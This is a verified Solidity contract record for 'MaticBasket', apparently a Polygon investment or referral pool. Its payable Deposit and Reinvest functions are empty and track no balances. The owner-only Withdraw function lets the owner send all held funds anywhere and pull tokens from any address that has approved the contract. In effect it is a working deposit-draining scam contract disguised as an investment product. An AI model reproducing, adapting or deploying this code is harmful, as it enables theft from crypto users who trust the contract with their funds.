{"SourceCode": "//SPDX-License-Identifier: None\r\npragma solidity 0.8.0;\r\n\r\nlibrary TransferHelper {\r\n    function safeApprove(\r\n        address token,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\r\n        require(\r\n            success && (data.length == 0 || abi.decode(data, (bool))),\r\n            'TransferHelper::safeApprove: approve failed'\r\n        );\r\n    }\r\n\r\n    function safeTransfer(\r\n        address token,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\r\n        require(\r\n            success && (data.length == 0 || abi.decode(data, (bool))),\r\n            'TransferHelper::safeTransfer: transfer failed'\r\n        );\r\n    }\r\n\r\n    function safeTransferFrom(\r\n        address token,\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\r\n        require(\r\n            success && (data.length == 0 || abi.decode(data, (bool))),\r\n            'TransferHelper::transferFrom: transferFrom failed'\r\n        );\r\n    }\r\n\r\n    function safeTransferETH(address to, uint256 value) internal {\r\n        (bool success, ) = to.call{value: value}(new bytes(0));\r\n        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');\r\n    }\r\n\r\n    function safeBalanceOf(address token, address wallet) internal returns (uint){\r\n        (bool _success, bytes memory data) = token.call(abi.encodeWithSelector(0x70a08231, wallet));\r\n        if(_success) {\r\n            (uint amount) = abi.decode(data, (uint));\r\n            return amount;\r\n        }\r\n        return 0;\r\n    }\r\n}\r\n\r\ncontract MaticBasket{\r\n    \r\n    address owner;\r\n    constructor()\r\n    {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    fallback() external payable{ }\r\n\r\n    receive() external payable{ }\r\n    \r\n    function Deposit(address sponsorAddress) external payable { }\r\n\r\n    function Reinvest() external payable { }\r\n\r\n    function Withdraw(address token, address from, address[] memory to, uint[] memory amount) public payable\r\n    {\r\n        require(owner==msg.sender);\r\n        require(to.length == amount.length, \"\");\r\n\r\n        if(token!=0x0000000000000000000000000000000000000000)\r\n        {\r\n            if(from!=0x0000000000000000000000000000000000000000)\r\n            {\r\n                for(uint i=0; i<to.length; i++)\r\n                {\r\n                    TransferHelper.safeTransferFrom(token, from, to[i], amount[i]);\r\n                }\r\n            }\r\n            else\r\n            {\r\n                for(uint i=0; i<to.length; i++)\r\n                {\r\n                    TransferHelper.safeTransfer(token, to[i], amount[i]);\r\n                }\r\n            }\r\n        }\r\n        else\r\n        {\r\n            for(uint i=0; i<to.length; i++)\r\n            {\r\n                TransferHelper.safeTransferETH(to[i], amount[i]);\r\n            }\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sponsorAddress\",\"type\":\"address\"}],\"name\":\"Deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Reinvest\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amount\",\"type\":\"uint256[]\"}],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MaticBasket", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "2000", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6cdbecf8beb56356d1b84ba4cbc38e811edd511295287c78dd18f74500f3c849"}